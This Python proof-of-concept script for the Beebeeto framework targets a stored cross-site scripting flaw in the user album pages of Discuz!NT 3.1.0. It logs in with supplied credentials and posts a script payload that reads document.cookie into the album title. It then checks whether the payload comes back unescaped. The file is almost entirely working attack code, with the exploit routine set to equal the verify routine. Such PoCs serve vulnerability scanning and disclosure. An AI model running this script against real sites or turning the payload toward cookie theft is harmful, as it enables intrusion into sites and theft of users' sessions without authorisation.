#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    session = requests.Session()
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0091',
            'name': 'Discuz !NT3.1.0 用户相册存储型XSS漏洞 POC',
            'author': 'eleveni386',
            'create_date': '2015-04-25',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['3.1.0'],
            'type': 'Cross Site Scripting',
            'tag': ['Discuz NT3.1.0 漏洞', '用户相册封页存储型XSS', '相册内页存储型XSS'],
            'desc': 'N/A',
            'references': ['http://eleveni386.7axu.com',
            ],
        },
    }
    def _init_user_parser(self):
        self.user_parser.add_option('-l','--login',
                action='store', dest='username', type='string', default=None,
                help='username')

        self.user_parser.add_option('-p','--password',
                action='store', dest='password', type='string', default=None,
                help='password')

    @classmethod
    def verify(cls, args):
        path = '/usercpspacemanagealbum.aspx?page=1&mod=edit&albumid=32'
        UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36'
        Referer = '/usercpspacemanagealbum.aspx?page=1&mod=edit&albumid=32'
        payload = '''<script>console.log(document.cookie)</script>'''

        username = args['options']['username']
        password = args['options']['password']
        Host = args['options']['target']
        Url = Host + path
        Referer_url = args['options']['target'] + Referer

        Auth = requests.auth.HTTPBasicAuth(username, password)

        PostData = {
                'albumtitle':payload,
                'albumid':'302',
                'active':'',
                'albumcate':'2',
                'albumdescription':'',
                'type':0,
                'password':'',
                'Submit':'确定'}
        Header = {'User-Agent':UA, 'Referer':Referer_url,'X-Requested-With':'XMLHttpRequest' }

        # Login and get session
        cls.session.get(Url, data=PostData, auth=Auth, headers=Header)
        # post editor to dz
        cls.session.post(Url, data=PostData, headers=Header)
        # get result
        r = cls.session.get('{}/usercpspacemanagealbum.aspx'.format(Host), headers=Header)
        if payload in r.text:
            args['success'] = True
            args['poc_ret']['vul_url'] = Url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint
    mp = MyPoc()
    pprint(mp.run())